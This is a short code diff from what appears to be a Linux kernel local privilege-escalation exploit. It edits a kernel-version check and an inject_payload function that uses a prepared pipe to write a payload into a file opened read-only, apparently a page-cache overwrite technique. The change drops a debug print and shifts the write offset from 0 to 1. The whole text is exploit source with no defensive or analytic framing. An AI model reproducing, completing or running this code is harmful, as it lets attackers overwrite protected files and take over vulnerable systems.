@@ -55,7 +55,6 @@ int validate_kernv() {
         perror("uname");
         return 1;
     }
-    printf("kernel version : %s\n", buffer.version);
     version_str = buffer.version;
     len = strlen(version_str);
     compile_year = 0;
@@ -114,7 +113,7 @@ void prepare_pipe(int p[2]) {
 int inject_payload(char *target, char *payload) {
     int fd = open(target, O_RDONLY);
     int p[2];
-    __off64_t offset = 0; 
+    __off64_t offset = 1; 
 
     prepare_pipe(p);
     fd = open(target, O_RDONLY);
